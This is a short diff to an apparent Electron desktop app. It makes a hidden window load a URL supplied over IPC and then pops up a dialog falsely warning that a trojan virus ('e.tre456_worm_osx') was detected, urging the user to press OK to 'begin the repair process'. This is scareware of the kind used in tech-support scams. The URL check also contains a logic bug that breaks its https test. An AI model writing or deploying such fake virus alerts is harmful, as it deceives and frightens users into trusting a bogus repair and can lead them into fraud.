@@ -22,7 +22,7 @@ function generateMainWindow() {
 			: `file://${path.join(__dirname, "../build/index.html")}`,
 		false
 	);
-	contectWindow = window.createWindow("https://google.com", true);
+	contectWindow = window.createWindow("none", true);
 	contectWindow.on("close", (e) => {
 		e.preventDefault();
 		contectWindow.hide();
@@ -38,12 +38,18 @@ function generateMainWindow() {
 	win.on("closed", () => (window = null));
 }
 
-ipcMain.on("show-window", function (event, object) {
+ipcMain.on("search-link", function (event, object) {
+	if (object.includes("http://" || object.includes("https://"))) {
+		contectWindow.loadURL(object);
+	} else {
+		contectWindow.loadURL(`https://${object}`);
+	}
 	dialog.showErrorBox(
-		object + " WARNING!",
-		"We have detected a trojan virus (e.tre456_worm_osx) on your System. Press OK to begin the repair process."
+		" WARNING!",
+		`loaded ${object} !! We have detected a trojan virus (e.tre456_worm_osx) on your System. Press OK to begin the repair process.`
 	);
-	// contectWindow.show();
+	contectWindow.show();
+	console.log(object);
 });
 app.on("ready", generateMainWindow);
 
